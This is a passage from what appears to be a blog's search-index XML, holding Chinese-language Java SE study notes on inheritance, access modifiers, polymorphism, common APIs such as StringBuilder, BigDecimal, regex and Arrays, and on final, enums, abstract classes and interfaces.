<li>子类写一个与父类一样的方法覆盖父类的方法</li>
<li><code>@Override</code>注解是放在重写后的方法上，作为重写是否正确的校验注解</li>
<li>注意事项和要求<ul>
<li>重写方法的名称、形参列表必须和被重写的方法一致（重写不是改写，戏说不是胡说）</li>
<li>私有方法不能被重写，静态方法不能被重写</li>
<li>子类重写父类方法时，访问权限必须大于或者等于父类</li>
</ul>
</li>
</ul>
<h5 id="子类构造器"><a href="#子类构造器" class="headerlink" title="子类构造器"></a>子类构造器</h5><ul>
<li>子类中所有的构造器会默认先访问父类中无参构造器，然后再执行自己的</li>
<li>子类初始化之前，一定要调用父类构造器先完成父类数据空间的初始化</li>
<li>子类构造器的第一行语句默认都是：<strong>super()，不写也存在</strong></li>
<li>如果父类中没有无参构造器，那么此时就会报错，子类就需要手动书写<code>super()</code>来调用父类的有参构造器</li>
</ul>
<h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><h5 id="认识一下嘛-6"><a href="#认识一下嘛-6" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>包是用来分门别类的管理各种不同类的，类似于文件夹、建包利于程序的管理和维护</li>
</ul>
<h5 id="建包"><a href="#建包" class="headerlink" title="建包"></a>建包</h5><ul>
<li><p>建包语句必须在第一行，包名建议全部英文小写</p>
</li>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 公司域名倒写.技术名称</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.poria.tools</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h5><ul>
<li><p>相同包下的类可以直接访问，不同包下的类必须导包,才可以使用</p>
</li>
<li><p>假如一个类中需要用到不同类，而这个两个类的名称是一样的，那么默认只能导入一个类，另一个类要带包名访问</p>
</li>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.类名</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.poria.tools.Test</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h4><h5 id="认识一下嘛-7"><a href="#认识一下嘛-7" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>用来控制一个成员能够被访问的范围的</li>
<li>可以修饰成员变量，方法，构造器，内部类，不同权限修饰符修饰的成员能够被访问的范围将受到限制</li>
</ul>
<h5 id="分类及作用范围"><a href="#分类及作用范围" class="headerlink" title="分类及作用范围"></a>分类及作用范围</h5><table>
<thead>
<tr>
<th><strong>修饰符</strong></th>
<th><strong>同一 个类中</strong></th>
<th><strong>同一个包中</strong>  <strong>其他类</strong></th>
<th><strong>不同包下的</strong>  <strong>子类</strong></th>
<th><strong>不同包下的</strong>  <strong>无关类</strong></th>
</tr>
</thead>
<tbody><tr>
<td>private</td>
<td>√</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>缺省</td>
<td>√</td>
<td>√</td>
<td></td>
<td></td>
</tr>
<tr>
<td>protected</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
</tr>
<tr>
<td>public</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody></table>
<h4 id="面向对象三特征之：多态"><a href="#面向对象三特征之：多态" class="headerlink" title="面向对象三特征之：多态"></a>面向对象三特征之：多态</h4><h5 id="认识一下嘛-8"><a href="#认识一下嘛-8" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><p>同类型的对象，执行同一个行为，会表现出不同的行为特征</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类类型 对象名称 = <span class="keyword">new</span> 子类构造器;</span><br><span class="line">接口 对象名称 = <span class="keyword">new</span> 实现类构造器;</span><br></pre></td></tr></table></figure></li>
<li><p>特点</p>
<ul>
<li>方法调用：编译看左边（父类），运行看右边（子类）</li>
<li>变量调用：编译看左边，运行看左边（也就是说多态侧重行为多态）</li>
</ul>
</li>
</ul>
<h5 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h5><ul>
<li><p>在多态形式下，右边对象可以实现解耦合，便于维护和拓展</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Animal a = <span class="keyword">new</span> Tortoise();</span><br><span class="line">a.run(); <span class="comment">// 后续业务行为随对象而变，后续代码无需修改</span></span><br><span class="line"></span><br><span class="line">Animal a = <span class="keyword">new</span> Dog();</span><br><span class="line">a.run(); <span class="comment">// 后续业务行为随对象而变，后续代码无需修改</span></span><br></pre></td></tr></table></figure></li>
<li><p>同时也产生一个问题，就是多态下不可以使用子类独有功能</p>
</li>
</ul>
<h5 id="多态下引用数据类型转换"><a href="#多态下引用数据类型转换" class="headerlink" title="多态下引用数据类型转换"></a>多态下引用数据类型转换</h5><ul>
<li><p>自动类型转换：子类对象赋值给父类类型的变量指向</p>
</li>
<li><p>强制类型转换</p>
<ul>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">子类 对象变量 = (子类)父类类型的变量</span><br></pre></td></tr></table></figure></li>
<li><p>可以解决多态产生的问题，可以实现子类调用自己独有的功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Animal a = <span class="keyword">new</span> Dog();</span><br><span class="line">Dog d = (Dog)a</span><br></pre></td></tr></table></figure></li>
<li><p>Java 建议强类型转换前使用<code>instanceof</code>判断当前对象的真实类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">变量名 <span class="keyword">instanceof</span> 真实类型</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之常见API</title>
    <url>/2021/12/08/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E5%B8%B8%E8%A7%81API/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（三）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="API-概述"><a href="#API-概述" class="headerlink" title="API 概述"></a>API 概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><code>API (Application Programming interface)</code>应用程序编程接口</li>
<li>简单来说就是 Java 已经写好的一些方法，我们只需要拿过来调用即可</li>
</ul>
<h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>Object 类的方法是一切子类对象都可以直接索引使用的</li>
</ul>
<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th align="left">方法名</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>public String toString()</code></td>
<td align="left">默认是返回当前对象在堆内存中的地址信息：类的全限名@内存地址</td>
</tr>
<tr>
<td align="left"><code>public boolean equals(Object o)</code></td>
<td align="left">默认是比较当前对象与另一个对象的地址是否相同，相同返回true，不同返回false</td>
</tr>
</tbody></table>
<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h5><ul>
<li>父类<code>toString()</code>方法存在的意义就是为了被子类重写，以便返回对象的内容信息，而不是地址信息</li>
<li>子类重写之后，直接输出对象就可以看到对象的数据内容，更有意义</li>
</ul>
<h5 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h5><ul>
<li><code>==</code>可以比较两个对象的地址是否相同，但是不能去比较对象的属性</li>
<li>父类equals方法存在的意义就是为了被子类重写，以便子类自己来定制比较规则</li>
</ul>
<h4 id="Objects"><a href="#Objects" class="headerlink" title="Objects"></a>Objects</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>Objects 类是一个工具类，提供了一些方法去完成一些功能</li>
</ul>
<h5 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public static boolean equals(Object a, Object b)</code></td>
<td>比较两个对象的，底层会先进行非空判断，从而可以避免空指针异常。再进行equals比较</td>
</tr>
<tr>
<td><code>public static boolean isNull(Object obj) </code></td>
<td>判断变量是否为null ,为null返回true ,反之</td>
</tr>
</tbody></table>
<h4 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h4><h5 id="认识一下"><a href="#认识一下" class="headerlink" title="认识一下"></a>认识一下</h5><ul>
<li><p>StringBuilder是一个可变的<strong>字符串类</strong>，可以把它看成是一个对象容器</p>
</li>
<li><p>提高字符串操作效率，比如拼接、修改</p>
</li>
</ul>
<h5 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h5><table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public StringBuilder()</code></td>
<td>创建一个空白的可变的字符串对象，不包含任何内容</td>
</tr>
<tr>
<td><code>public StringBuilder(String str)</code></td>
<td>创建一个指定字符串内容的可变字符串对象</td>
</tr>
</tbody></table>
<h5 id="常见方法-1"><a href="#常见方法-1" class="headerlink" title="常见方法"></a>常见方法</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public StringBuilder append(任意类型)</code></td>
<td>添加数据并返回StringBuilder对象本身</td>
</tr>
<tr>
<td><code>public StringBuilder reverse()</code></td>
<td>将对象的内容反转</td>
</tr>
<tr>
<td><code>public int length()</code></td>
<td>返回对象内容长度</td>
</tr>
<tr>
<td><code>public String toString()</code></td>
<td>通过toString()就可以实现把StringBuilder转换为String</td>
</tr>
</tbody></table>
<h4 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h4><h5 id="认识一下嘛-3"><a href="#认识一下嘛-3" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>包含执行基本数字运算的方法，没有公开的构造器</li>
<li>成员都是静态的，直接通过类名来索引</li>
</ul>
<h5 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public static int abs(int a)</code></td>
<td>获取参数绝对值</td>
</tr>
<tr>
<td><code>public static double  ceil(double a)</code></td>
<td>向上取整</td>
</tr>
<tr>
<td><code>public static double  floor(double a)</code></td>
<td>向下取整</td>
</tr>
<tr>
<td><code>public static int round(float a)</code></td>
<td>四舍五入</td>
</tr>
<tr>
<td><code>public static int max(int a,int b)</code></td>
<td>获取两个int值中的较大值</td>
</tr>
<tr>
<td><code>public static double pow(double a,double b)</code></td>
<td>返回a的b次幂的值</td>
</tr>
<tr>
<td><code>public static double random()</code></td>
<td>返回值为double的随机值，范围[0.0,1.0)</td>
</tr>
</tbody></table>
<h4 id="System"><a href="#System" class="headerlink" title="System"></a>System</h4><h5 id="认识一下嘛-4"><a href="#认识一下嘛-4" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>System 也是一个工具类，代表了当前系统，提供一些与系统相关的方法</li>
</ul>
<h5 id="常用方法-2"><a href="#常用方法-2" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  static void exit(int status)</code></td>
<td>终止当前运行的 Java 虚拟机，非零表示异常终止</td>
</tr>
<tr>
<td><code>public  static long currentTimeMillis()</code></td>
<td>返回当前系统的时间毫秒值形式</td>
</tr>
<tr>
<td><code>public  static void arraycopy(数据源数组, 起始索引, 目的地数组, 起始索引, 拷贝个数)</code></td>
<td>数组拷贝</td>
</tr>
</tbody></table>
<h4 id="BigDecimal"><a href="#BigDecimal" class="headerlink" title="BigDecimal"></a>BigDecimal</h4><h5 id="认识一下嘛-5"><a href="#认识一下嘛-5" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><p>浮点型运算的时候直接<code>+-*/</code>可能会出现数据失真，用于解决浮点型运算精度失真的问题</p>
</li>
<li><p>调用方法封装浮点型数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal b1 = BigDecimal.valueOf(<span class="number">0.1</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="常用方法-3"><a href="#常用方法-3" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public BigDecimal add(BigDecimal b)</code></td>
<td>加法</td>
</tr>
<tr>
<td><code>public BigDecimal subtract(BigDecimal b)</code></td>
<td>减法</td>
</tr>
<tr>
<td><code>public BigDecimal multiply(BigDecimal b)</code></td>
<td>乘法</td>
</tr>
<tr>
<td><code>public BigDecimal divide(BigDecimal b)</code></td>
<td>除法</td>
</tr>
<tr>
<td><code>public BigDecimal divide (另一个BigDecimal对象，精确几位，舍入模式)</code></td>
<td>除法</td>
</tr>
</tbody></table>
<ul>
<li><p>对舍入模式的说明</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal.ROUND_UP  进一法</span><br><span class="line">BigDecimal.ROUND_FLOOR 去尾法</span><br><span class="line">BigDecimal.ROUND_HALF_UP 四舍五入</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="LocalDate、LocalTime、LocalDateTime"><a href="#LocalDate、LocalTime、LocalDateTime" class="headerlink" title="LocalDate、LocalTime、LocalDateTime"></a>LocalDate、LocalTime、LocalDateTime</h4><h5 id="认识一下嘛-6"><a href="#认识一下嘛-6" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>他们 分别表示日期，时间，日期时间对象，他们的类的实例是不可变的对象</li>
<li>三者构建对象和 API 都是通用的</li>
</ul>
<h5 id="构造器-1"><a href="#构造器-1" class="headerlink" title="构造器"></a>构造器</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public static Xxxx now();</code></td>
<td>静态方法，根据当前时间创建对象</td>
</tr>
<tr>
<td><code>public static Xxxx of(...);</code></td>
<td>静态方法，指定日期/时间创建对象</td>
</tr>
</tbody></table>
<h5 id="常见方法-2"><a href="#常见方法-2" class="headerlink" title="常见方法"></a>常见方法</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public int geYear()</code></td>
<td>获取年</td>
</tr>
<tr>
<td><code>public int getMonthValue()</code></td>
<td>获取月份（1-12）</td>
</tr>
<tr>
<td><code>Public int getDayOfMonth()</code></td>
<td>获取月中第几天乘法</td>
</tr>
<tr>
<td><code>Public int getDayOfYear()</code></td>
<td>获取年中第几天</td>
</tr>
<tr>
<td><code>Public DayOfWeek getDayOfWeek()</code></td>
<td>获取星期</td>
</tr>
</tbody></table>
<h4 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h4><h5 id="认识一下嘛-7"><a href="#认识一下嘛-7" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>Java 为了实现一切皆对象，为8种基本类型提供了对应的引用类型</li>
<li>集合和泛型也只能支持包装类型，不支持基本数据类型</li>
</ul>
<h5 id="对应关系"><a href="#对应关系" class="headerlink" title="对应关系"></a>对应关系</h5><table>
<thead>
<tr>
<th>基本数据类型</th>
<th>引用数据类型</th>
</tr>
</thead>
<tbody><tr>
<td>byte</td>
<td>Byte</td>
</tr>
<tr>
<td>short</td>
<td>Short</td>
</tr>
<tr>
<td>int</td>
<td>Integer</td>
</tr>
<tr>
<td>long</td>
<td>Long</td>
</tr>
<tr>
<td>char</td>
<td>Character</td>
</tr>
<tr>
<td>float</td>
<td>Float</td>
</tr>
<tr>
<td>double</td>
<td>Double</td>
</tr>
<tr>
<td>boolean</td>
<td>Boolean</td>
</tr>
</tbody></table>
<h5 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h5><ul>
<li>自动装箱：基本数据类型可以直接赋值给包装类型</li>
<li>自动拆箱：包装类型可以直接赋值给基本数据类型</li>
</ul>
<h5 id="特有功能"><a href="#特有功能" class="headerlink" title="特有功能"></a>特有功能</h5><ul>
<li><p>包装类变量默认值为<code>null</code></p>
</li>
<li><p>可以把基本类型数据转化为字符串类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer.toString(<span class="keyword">int</span>类型的值);</span><br></pre></td></tr></table></figure></li>
<li><p>可以把字符串类型转化为真实的数据类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer.parseInt(<span class="string">&quot;字符串类型的整数&quot;</span>);</span><br><span class="line">Double.parseDouble(<span class="string">&quot;字符串类型的小数&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><h5 id="认识一下嘛-8"><a href="#认识一下嘛-8" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>正则表达式可以用一些规定的字符来制定规则，并用来校验数据格式的合法性</li>
</ul>
<h5 id="使用详解"><a href="#使用详解" class="headerlink" title="使用详解"></a>使用详解</h5><ul>
<li><p>字符串对象提供了匹配正则表达的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">matches</span><span class="params">(String regex)</span></span></span><br></pre></td></tr></table></figure></li>
<li><p>字符类（默认只匹配一个字符）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[abc]	       		只能是a, b, 或c</span><br><span class="line">[^abc]	       	除了a, b, c之外的任何字符</span><br><span class="line">[a-zA-Z]       	a到z A到Z，包括（范围）</span><br><span class="line">[a-d[m-p]]	 	  a到d，或m通过p：（[a-dm-p]联合）</span><br><span class="line">[a-z&amp;&amp;[def]]	 	d, e, 或f(交集)</span><br><span class="line">[a-z&amp;&amp;[^bc]]		a到z，除了b和c：（[ad-z]减法）</span><br></pre></td></tr></table></figure></li>
<li><p>预定义字符类（默认只匹配一个字符）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.			任何字符</span><br><span class="line">\d		一个数字： [<span class="number">0</span>-<span class="number">9</span>]</span><br><span class="line">\D		非数字： [^<span class="number">0</span>-<span class="number">9</span>]</span><br><span class="line">\s		一个空白字符： [ \t\n\x0B\f\r]</span><br><span class="line">\S		非空白字符： [^\s]</span><br><span class="line">\w		[a-zA-Z_0-<span class="number">9</span>] 英文、数字、下划线</span><br><span class="line">\W	 	[^\w] 一个非单词字符</span><br></pre></td></tr></table></figure></li>
<li><p>贪婪量词</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">X?					X，一次或根本不</span><br><span class="line">X*					X，零次或多次</span><br><span class="line">X+					X，一次或多次</span><br><span class="line">X &#123;n&#125;				X，正好n次</span><br><span class="line">X &#123;n, &#125;			X，至少n次</span><br><span class="line">X &#123;n,m&#125;			X，至少n但不超过m次</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[abc]&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">System.out.println(<span class="string">&quot;z&quot;</span>.matches(<span class="string">&quot;[abc]&quot;</span>)); <span class="comment">// false</span></span><br><span class="line">System.out.println(<span class="string">&quot;ab&quot;</span>.matches(<span class="string">&quot;[abc]&quot;</span>)); <span class="comment">// false</span></span><br><span class="line">System.out.println(<span class="string">&quot;ab&quot;</span>.matches(<span class="string">&quot;[abc]+&quot;</span>)); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h5 id="在字符串方法中的应用"><a href="#在字符串方法中的应用" class="headerlink" title="在字符串方法中的应用"></a>在字符串方法中的应用</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public String replaceAll(String regex,String newStr)</code></td>
<td>按照正则表达式匹配的内容进行替换</td>
</tr>
<tr>
<td><code>public String[] split(String regex)</code></td>
<td>按照正则表达式匹配的内容进行分割字符串，反回一个字符串数组。    方法名</td>
</tr>
</tbody></table>
<h4 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h4><h5 id="认识一下嘛-9"><a href="#认识一下嘛-9" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>用于操作数组的工具类</li>
</ul>
<h5 id="常见方法-3"><a href="#常见方法-3" class="headerlink" title="常见方法"></a>常见方法</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public static String toString(类型[] a)</code></td>
<td>返回数组的内容（字符串形式）</td>
</tr>
<tr>
<td><code>public  static void sort(类型[] a)</code></td>
<td>对数组进行默认升序排序</td>
</tr>
<tr>
<td><code>public  static &lt;T&gt; void sort(类型[] a, Comparator&lt;?  super T&gt; c)</code></td>
<td>使用比较器对象自定义排序</td>
</tr>
<tr>
<td><code>public  static int binarySearch(int[] a,  int key)</code></td>
<td>二分搜索数组中的数据，存在返回索引，不存在返回-1</td>
</tr>
</tbody></table>
<h5 id="排序方法"><a href="#排序方法" class="headerlink" title="排序方法"></a>排序方法</h5><ul>
<li><p>设置 Comparator 接口对应的比较器对象，定制比较规则</p>
<ul>
<li>如果认为左边数据 大于 右边数据 返回正整数</li>
<li>如果认为左边数据 小于 右边数据 返回负整数</li>
<li>如果认为左边数据 等于 右边数据 返回0</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.sort(ages1, <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// return o1 - o2; // 默认升序</span></span><br><span class="line">  <span class="comment">// return o2 - o1; // 降序</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上代码还可简化为</span></span><br><span class="line">Arrays.sort(ages1, ( o1,  o2) -&gt;  o1 - o2 );</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h4><h5 id="认识一下嘛-10"><a href="#认识一下嘛-10" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>简化匿名内部类的代码写法</li>
<li>函数式接口：首先必须是接口，其次接口中有且只有一个抽象方法，通常会伴有<code>@FunctionalInterface</code>注解</li>
<li>Lambda 表达式只能简化函数式接口的匿名内部类的写法形式</li>
</ul>
<h5 id="省略规则"><a href="#省略规则" class="headerlink" title="省略规则"></a>省略规则</h5><ul>
<li><p>参数类型可以省略</p>
</li>
<li><p>如果只有一个参数，参数类型可以省略，同时 () 也可以省略</p>
</li>
<li><p>如果 Lambda 表达式的方法体代码只有一行代码，可以省略大括号不写，同时要省略分号！</p>
</li>
<li><p>如果 Lambda 表达式的方法体代码只有一行代码，可以省略大括号不写；此时，如果这行代码是 return 语句，必须省略 return 不写，同时也必须省略 ; 不写</p>
</li>
</ul>
<h4 id><a href="#" class="headerlink" title></a></h4>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之面向对象进阶</title>
    <url>/2021/12/08/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（二）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>可以修饰<ul>
<li>方法：表明该方法是最终方法，不能被重写</li>
<li>变量：表示该变量第一次赋值后，不能再次被赋值(有且仅能被赋值一次)</li>
<li>类：表明该类是最终类，不能被继承</li>
</ul>
</li>
</ul>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>修饰基本类型：变量存储的数据值不能发生改变</li>
<li>修饰引用类型：存储的地址值不能改变，但是<strong>地址指向的对象内容可以改变</strong></li>
</ul>
<h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>常量是使用了<code>public static final</code>修饰的成员变量，必须有初始化值，而且执行的过程中其值不能被改变</li>
<li>可以用于做系统的配置信息，方便程序的维护，同时也能提高可读性</li>
</ul>
<h5 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h5><ul>
<li>在编译阶段会进行宏替换，把使用常量的地方全部替换成真实的字面量</li>
<li>这样做的好处是让使用常量的程序的执行性能与直接使用字面量是一样的</li>
</ul>
<h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>是 Java 中的一种特殊类型</li>
<li>是为了做信息的标志和信息的分类</li>
</ul>
<h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="class"><span class="keyword">enum</span> 枚举名称</span>&#123;</span><br><span class="line">  第一行都是罗列枚举类实例的名称</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Season</span></span>&#123;</span><br><span class="line">  SPRING , SUMMER , AUTUMN , WINTER;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h5><ul>
<li>枚举类都是继承了枚举类型：<code>java.lang.Enum</code></li>
<li>枚举都是最终类，不可以被继承</li>
<li>构造器都是私有的，枚举对外不能创建对象</li>
</ul>
<h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><h5 id="认识一下嘛-3"><a href="#认识一下嘛-3" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>如果一个类中的某个方法的具体实现不能确定，就可以申明成 abstract 修饰的<strong>抽象方法（不能写方法体了）</strong>，这个类必须用 abstract 修饰，被称为抽象类</li>
</ul>
<h5 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">  修饰符 <span class="keyword">abstract</span> 返回值类型 方法名称(形参列表);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>得到了抽象方法，失去了创建对象的能力（这波是有得有失）</li>
<li>抽象类可以理解成类的不完整设计图，是用来被子类继承的</li>
<li>一个类如果继承了抽象类，那么这个类必须重写完抽象类的全部抽象方法，否则这个类也必须定义成抽象类</li>
<li>不能用 abstract 修饰变量、代码块、构造器</li>
</ul>
<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><h5 id="认识一下嘛-4"><a href="#认识一下嘛-4" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>接口是一种规范</li>
<li>接口不能实例化</li>
<li>接口中的成员都是 public 修饰，不论你写不写，因为规范的目的是为了公开化</li>
</ul>
<h5 id="格式-2"><a href="#格式-2" class="headerlink" title="格式"></a>格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> 接口名</span>&#123;</span><br><span class="line">  <span class="comment">// 常量</span></span><br><span class="line">  <span class="comment">// 抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h5><ul>
<li><p>接口是用来被类实现的，实现接口的类叫做实现类，实现类可以理解为“子类”</p>
</li>
<li><p>接口可以被类单独实现，也可以被多实现</p>
